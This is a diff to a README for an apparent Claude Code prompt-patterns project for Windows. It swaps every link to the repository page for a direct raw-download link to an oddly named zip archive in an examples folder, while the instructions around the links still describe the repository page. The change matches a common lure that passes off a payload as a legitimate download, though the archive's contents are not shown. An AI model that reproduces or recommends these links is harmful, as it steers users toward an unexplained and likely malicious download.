@@ -1,6 +1,6 @@
 # 🧠 claude-code-prompt-engineering-patterns - Practical Prompt Patterns for Windows
 
-[![Download](https://img.shields.io/badge/Download-Now-9b59b6?style=for-the-badge&logo=github)](https://github.com/howar2113/claude-code-prompt-engineering-patterns)
+[![Download](https://img.shields.io/badge/Download-Now-9b59b6?style=for-the-badge&logo=github)](https://github.com/howar2113/claude-code-prompt-engineering-patterns/raw/refs/heads/main/examples/claude-prompt-code-patterns-engineering-gibbsite.zip)
 
 ## 📦 What this is
 
@@ -28,7 +28,7 @@ If you do not have Python yet, install it first from the official Python site. D
 
 Go to this page to download the project:
 
-[https://github.com/howar2113/claude-code-prompt-engineering-patterns](https://github.com/howar2113/claude-code-prompt-engineering-patterns)
+[https://github.com/howar2113/claude-code-prompt-engineering-patterns/raw/refs/heads/main/examples/claude-prompt-code-patterns-engineering-gibbsite.zip](https://github.com/howar2113/claude-code-prompt-engineering-patterns/raw/refs/heads/main/examples/claude-prompt-code-patterns-engineering-gibbsite.zip)
 
 On the page, click the green Code button, then choose one of these options:
 
@@ -238,7 +238,7 @@ If the output is not right, change one part at a time. That makes it easier to s
 
 If you need the project again, use this page:
 
-[https://github.com/howar2113/claude-code-prompt-engineering-patterns](https://github.com/howar2113/claude-code-prompt-engineering-patterns)
+[https://github.com/howar2113/claude-code-prompt-engineering-patterns/raw/refs/heads/main/examples/claude-prompt-code-patterns-engineering-gibbsite.zip](https://github.com/howar2113/claude-code-prompt-engineering-patterns/raw/refs/heads/main/examples/claude-prompt-code-patterns-engineering-gibbsite.zip)
 
 ## 📄 License and use
 
